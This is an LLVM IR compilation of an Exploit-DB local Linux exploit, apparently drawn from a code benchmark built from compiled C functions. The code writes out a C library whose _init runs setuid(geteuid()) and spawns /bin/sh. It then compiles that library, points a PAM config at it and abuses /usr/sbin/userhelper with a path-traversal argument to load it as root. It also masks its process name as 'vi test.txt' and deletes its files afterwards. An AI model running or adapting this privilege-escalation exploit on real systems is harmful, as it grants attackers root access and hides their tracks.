; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19710.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19710.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [12 x i8] c"vi test.txt\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"abc.c\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.3 = private unnamed_addr constant [20 x i8] c"#include<stdlib.h>\0A\00", align 1
@.str.4 = private unnamed_addr constant [20 x i8] c"#include<unistd.h>\0A\00", align 1
@.str.5 = private unnamed_addr constant [23 x i8] c"#include<sys/types.h>\0A\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"void _init(void) {\0A\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c"\09setuid(geteuid());\0A\00", align 1
@.str.8 = private unnamed_addr constant [21 x i8] c"\09system(\22/bin/sh\22);\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c"}\00", align 1
@.str.10 = private unnamed_addr constant [45 x i8] c"echo -e auth\09required\09$PWD/abc.so > abc.conf\00", align 1
@.str.11 = private unnamed_addr constant [19 x i8] c"chmod 755 abc.conf\00", align 1
@.str.12 = private unnamed_addr constant [28 x i8] c"gcc -fPIC -o abc.o -c abc.c\00", align 1
@.str.13 = private unnamed_addr constant [27 x i8] c"ld -shared -o abc.so abc.o\00", align 1
@.str.14 = private unnamed_addr constant [17 x i8] c"chmod 755 abc.so\00", align 1
@.str.15 = private unnamed_addr constant [46 x i8] c"/usr/sbin/userhelper -w ../../..$PWD/abc.conf\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"rm -rf abc.*\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %6 = load i8**, i8*** %4, align 8
  %7 = getelementptr inbounds i8*, i8** %6, i64 0
  %8 = load i8*, i8** %7, align 8
  %9 = call i32 @strcpy(i8* %8, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0))
  %10 = call i32* @fopen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  store i32* %10, i32** %5, align 8
  %11 = load i32*, i32** %5, align 8
  %12 = call i32 @fprintf(i32* %11, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0))
  %13 = load i32*, i32** %5, align 8
  %14 = call i32 @fprintf(i32* %13, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0))
  %15 = load i32*, i32** %5, align 8
  %16 = call i32 @fprintf(i32* %15, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0))
  %17 = load i32*, i32** %5, align 8
  %18 = call i32 @fprintf(i32* %17, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  %19 = load i32*, i32** %5, align 8
  %20 = call i32 @fprintf(i32* %19, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0))
  %21 = load i32*, i32** %5, align 8
  %22 = call i32 @fprintf(i32* %21, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0))
  %23 = load i32*, i32** %5, align 8
  %24 = call i32 @fprintf(i32* %23, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0))
  %25 = load i32*, i32** %5, align 8
  %26 = call i32 @fclose(i32* %25)
  %27 = call i32 @system(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.10, i64 0, i64 0))
  %28 = call i32 @system(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.11, i64 0, i64 0))
  %29 = call i32 @system(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.12, i64 0, i64 0))
  %30 = call i32 @system(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.13, i64 0, i64 0))
  %31 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.14, i64 0, i64 0))
  %32 = call i32 @system(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.15, i64 0, i64 0))
  %33 = call i32 @system(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
